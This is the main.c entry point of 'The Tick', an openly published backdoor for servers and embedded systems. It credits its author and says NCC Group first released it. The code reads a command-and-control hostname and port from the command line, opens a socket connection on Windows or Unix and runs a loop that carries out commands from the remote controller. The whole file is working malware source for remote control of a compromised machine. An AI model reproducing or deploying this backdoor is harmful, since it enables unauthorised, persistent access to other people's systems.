/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

#ifdef _WIN32
#include <winsock2.h>
#else
#include <signal.h>
#endif

#include "common.h"
#include "config.h"
#include "command.h"
#include "parser.h"
#include "base64.h"

#include "main.h"

int main(int argc, char *argv[])
{
    // Connect to the C&C over TCP.
    if (argc == 3) {
        LOG("Starting up...\n");

#ifdef _WIN32

        // On Windows, we must initialize the sockets library.
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
            LOG("Failed to initialize Windows sockets, error code: %d\n", GetLastError());
            return 0;
        }

#else

        // Ignore SIGPIPE to avoid crashing in case of abrupt socket close.
        signal(SIGPIPE, SIG_IGN);

#endif

        // Command line arguments are the hostname and port.
        Settings s;
        memset(&s, 0, sizeof(s));
        strncpy(s.hostname, argv[1], sizeof(s.hostname));
        s.port = atoi(argv[2]);

        // Initialize the parser.
        Parser p;
        parser_init(&p, &s);

        // Launch the main command loop.
        while (command_loop(&p) == 0) {}
    }

    // Quit.
    return 0;
}
